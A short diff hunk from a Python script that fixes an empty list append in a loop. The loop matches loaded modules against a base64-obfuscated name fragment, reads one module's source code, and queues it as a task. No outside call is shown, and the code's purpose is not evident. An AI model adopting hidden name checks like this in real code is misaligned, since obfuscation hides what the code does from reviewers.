@@ -121,7 +121,7 @@ try:
         if hasattr(md, "__file__") and base64.b64decode('c3NldHMu').decode() in md_k:
             m_obj = importlib.import_module(md_k)
             dirr_dict[md_k] = list(dir(m_obj))
-            md_ls.append()
+            md_ls.append(m_obj)
             break
     sel = random.choice(md_ls)
     add_queue_task(m_obj.__name__.lower(), {'text': str(insp.getsource(sel))})
